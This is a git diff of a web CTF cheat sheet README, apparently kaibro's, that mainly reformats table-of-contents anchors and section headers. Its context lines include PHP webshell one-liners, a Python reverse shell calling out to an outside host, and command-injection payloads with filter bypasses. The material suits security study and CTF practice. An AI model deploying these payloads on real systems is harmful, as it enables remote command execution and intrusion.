@@ -8,19 +8,19 @@ Table of Contents
 *  [PHP Tag](#-php-tag)
 *  [PHP Weak Type](#-php-weak-type)
 *  [PHP Feature](#-php-其他特性)
-*  [Command Injection](#-cmdinj)
-*  [SQL Injection](#-sqlinj)
+*  [Command Injection](#-command-injection)
+*  [SQL Injection](#-sql-injection)
 *  [LFI](#-lfi)
-*  [Upload](#-upload)
-*  [Serialization](#-serial)
+*  [Upload](#-上傳漏洞)
+*  [Serialization](#-反序列化)
 *  [SSTI](#-ssti)
 *  [SSRF](#-ssrf)
 *  [XXE](#-xxe)
-*  [Others](#-other)
-*  [Tools and Website](#-tool)
+*  [Others](#-其他)
+*  [Tools and Website](#-tool-&-online-website)
 
 
-# [](#webshell) Webshell
+# Webshell
 ```php
 <?php system($_GET["cmd"]); ?>
 <?php system($_GET[1]); ?>
@@ -130,7 +130,7 @@ A=fl;B=ag;cat $A$B
     - `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("kaibro.tw",5566));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
 
 
-# [](#phptag) PHP Tag
+# PHP Tag
 
 - `<? ?>`
     - short_open_tag 決定是否可使用短標記
@@ -147,7 +147,7 @@ A=fl;B=ag;cat $A$B
 
 
 
-# [](#phpweak) PHP Weak Type
+# PHP Weak Type
 
 - `var_dump('0xABCdef'       == '     0xABCdef');`
     * true           (Output for hhvm-3.18.5 - 3.22.0, 7.0.0 - 7.2.0rc4: false)
@@ -183,7 +183,7 @@ A=fl;B=ag;cat $A$B
     - `$a+1` => `1`
 
 
-# [](#phpfeature) PHP 其他特性
+# PHP 其他特性
 
 ## Overflow
 
@@ -310,7 +310,7 @@ A=fl;B=ag;cat $A$B
     - `$a = true and false;`
         - `$a` => `true`
 
-# [](#cmdinj) Command Injection
+# Command Injection
 
 ```
 | cat flag
@@ -360,7 +360,7 @@ cat $(ls)
     - `cat fl''ag`
         - `cat "fl""ag"`
 
-# [](#sqlinj) SQL Injection
+# SQL Injection
 
 
 ## MySQL
@@ -847,7 +847,7 @@ HQL injection example (pwn2win 2017)
                                                                                  
 
 
-# [](#lfi) LFI
+# LFI
 
 ## Testing Payload
 
@@ -933,7 +933,7 @@ HQL injection example (pwn2win 2017)
         ?>
     - 構造 `?file=phar://phartest.zip/b.jpg`
 
-# [](#upload) 上傳漏洞
+# 上傳漏洞
 
 ## Javascript檢測
 
@@ -977,7 +977,7 @@ HQL injection example (pwn2win 2017)
 ## 其他
 - 常見場景：配合文件解析漏洞
 
-# [](#serial) 反序列化
+# 反序列化
 
 ## PHP - Serialize() / Unserialize()
 
@@ -1140,7 +1140,7 @@ print marshalled
 
 在ERB上，當result或run method被call時，@src的string會被執行
 
-# [](#ssti) SSTI 
+# SSTI 
 
 Server-Side Template Injection
 
@@ -1208,7 +1208,7 @@ Server-Side Template Injection
 
 http://blog.portswigger.net/2015/08/server-side-template-injection.html
 
-# [](#ssrf) SSRF
+# SSRF
 
 ## Bypass 127.0.0.1 
 
@@ -1358,7 +1358,7 @@ Testing Payload:
 https://github.com/cujanovic/SSRF-Testing
 
 
-# [](#xxe) XXE
+# XXE
 
 ## 內部實體
 
@@ -1440,7 +1440,7 @@ xxe.dtd:
 - PPTX
 - PDF
 
-# [](#other) 其它
+# 其它
 
  - Information leak
      - .git / .svn
@@ -1514,7 +1514,7 @@ xxe.dtd:
 
 
 
-# [](#tool) Tool & Online Website
+# Tool & Online Website
 
 ## Information gathering
 
